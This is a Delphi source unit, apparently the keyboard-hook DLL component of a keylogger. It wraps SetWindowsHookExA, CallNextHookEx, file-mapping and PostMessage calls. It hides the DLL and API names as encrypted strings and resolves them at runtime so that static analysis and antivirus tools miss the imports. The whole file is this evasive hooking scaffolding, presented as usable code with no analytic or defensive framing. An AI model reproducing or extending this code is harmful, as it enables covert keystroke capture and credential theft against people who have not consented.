unit uKbrdDl;

interface

uses
  Windows, uEnc;

const
  pS = 23; // Encrypt Password
  k2 = 'ixmer1dIvAgTkvvJ'; // Kernel32.dll
  u2 = '8NXOMOoOaXFVjD'; // User32.dll
var
  hK2, hU2: Cardinal;

type
  tCNHE = function(hhk: HHOOK; nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
  tOFM = function(dwDesiredAccess: DWORD; bInheritHandle: BOOL; lpName: PChar): THandle; stdcall;
  tMVOF = function(hFileMappingObject: THandle; dwDesiredAccess: DWORD; dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap: DWORD): Pointer; stdcall;
  tUVOF = function(lpBaseAddress: Pointer): BOOL; stdcall;
  tPM = function(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): BOOL; stdcall;
  tCH = function(hObject: THandle): BOOL; stdcall;
  tSWHE = function (idHook: Integer; lpfn: TFNHookProc; hmod: HINST; dwThreadId: DWORD): HHOOK; stdcall;
  tUWHE = function (hhk: HHOOK): BOOL; stdcall;

function CNHE(hhk: HHOOK; nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; // CallNextHookEx
function OFM(dwDesiredAccess: DWORD; bInheritHandle: BOOL; lpName: PChar): THandle; // OpenFileMapping
function MVOF(hFileMappingObject: THandle; dwDesiredAccess: DWORD; dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap: DWORD): Pointer; // MapViewOfFile
function UVOF(lpBaseAddress: Pointer): BOOL; // UnmapViewOfFile
function PM(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): BOOL; // PostMessageA
function CH(hObject: THandle): BOOL; // CloseHandle
function SWHE(idHook: Integer; lpfn: TFNHookProc; hmod: HINST; dwThreadId: DWORD): HHOOK; // SetWindowsHookExA
function UWHE(hhk: HHOOK): BOOL; // UnhookWindowsHookEx

implementation

{****************************************************************************
                                  Encrypted Functions
****************************************************************************}

function EN(S: string): string;
begin
  Result := Encrypt(S, pS + 2318);
end; { Encode }

function DE(S: string): string;
begin
  Result := Decrypt(S, pS + 2318);
end; { Decode }

function LL(Nm: string; fLs: Cardinal = 0): Cardinal;
begin
  if Nm = k2 then begin
    if hK2 = 0 then
      hK2 := LoadLibraryExA(Pchar(DE(Nm)), 0, fLs);
    Result := hK2;
  end else
    if Nm = u2 then begin
      if hU2 = 0 then
        hU2 := LoadLibraryExA(PChar(DE(Nm)), 0, fLs);
      Result := hU2;
    end;
end; { LoadLibraryExA }

function GP(MID: Cardinal; Key: string): Pointer;
begin
  Result := GetProcAddress(MID, PChar(DE(Key)));
end; { GetProcAddress }

{****************************************************************************
                                  Windows Functions
****************************************************************************}

var
  fCNHE: tCNHE;
function CNHE(hhk: HHOOK; nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
begin
  if not Assigned(@fCNHE) then @fCNHE := GP(LL(u2), 'K5M+ltHDvDu7NeWJuwN');
  Result := fCNHE(hhk, nCode, wParam, lParam);
end;

var
  fOFM: tOFM;
function OFM(dwDesiredAccess: DWORD; bInheritHandle: BOOL; lpName: PChar): THandle;
begin
  if not Assigned(fOFM) then @fOFM := GP(LL(k2), 'GVgcjyvTb5VyBTatnShJiC');
  Result := fOFM(dwDesiredAccess, bInheritHandle, lpName);
end;

var
  fMVOF: tMVOF;
function MVOF(hFileMappingObject: THandle; dwDesiredAccess: DWORD; dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap: DWORD): Pointer;
begin
  if not Assigned(fMVOF) then @fMVOF := GP(LL(k2), 'ElrdJtydBuvxrqaMMA');
  Result := fMVOF(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);
end;

var
  fUVOF: tUVOF;
function UVOF(lpBaseAddress: Pointer): BOOL;
begin
  if not Assigned(fUVOF) then @fUVOF := GP(LL(k2), 'cxl7akeqkqxQgIbuYsOK');
  Result := fUVOF(lpBaseAddress);
end;

var
  fPM: tPM;
function PM(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): BOOL;
begin
  if not Assigned(fPM) then @fPM := GP(LL(u2), 'Zh6j2lEN75JeQX/i');
  Result := fPM(hWnd, Msg, wParam, lParam);
end;

var
  fCH: tCH;
function CH(hObject: THandle): BOOL;
begin
  if not Assigned(fCH) then @fCH := GP(LL(k2), 'KNs2FZto48ZVWFH');
  Result := fCH(hObject);
end;

var
  fSWHE: tSWHE;
function SWHE(idHook: Integer; lpfn: TFNHookProc; hmod: HINST; dwThreadId: DWORD): HHOOK;
begin
  if not Assigned(fSWHE) then @fSWHE := GP(LL(u2), 'aBf0zyP8eAVUY9NUxa9Vn/O');
  Result := fSWHE(idHook, lpfn, hmod, dwThreadId);
end;

var
  fUWHE: tUWHE;
function UWHE(hhk: HHOOK): BOOL;
begin
  if not Assigned(fUWHE) then @fUWHE := GP(LL(u2), 'cx16/RVZYTLzrtegD5yczYU+/C');
  Result := fUWHE(hhk);
end;

end.

